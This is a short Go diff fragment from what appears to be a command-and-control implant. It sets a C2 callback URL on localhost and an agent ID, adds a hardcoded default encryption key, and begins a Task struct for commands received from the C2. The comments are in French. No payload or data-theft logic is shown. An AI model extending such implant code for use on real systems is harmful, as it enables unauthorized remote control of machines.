@@ -14,6 +14,7 @@ import (
 // Cette valeur sera injectée au moment de la compilation.
 var C2_URL = "http://localhost:8000/c2/implant/callback"
 var AgentID = "default_agent"
+var EncryptionKey = "_THIS_IS_A_DEFAULT_32_BYTE_KEY_"
 
 // Task représente une commande reçue du C2.
 type Task struct {
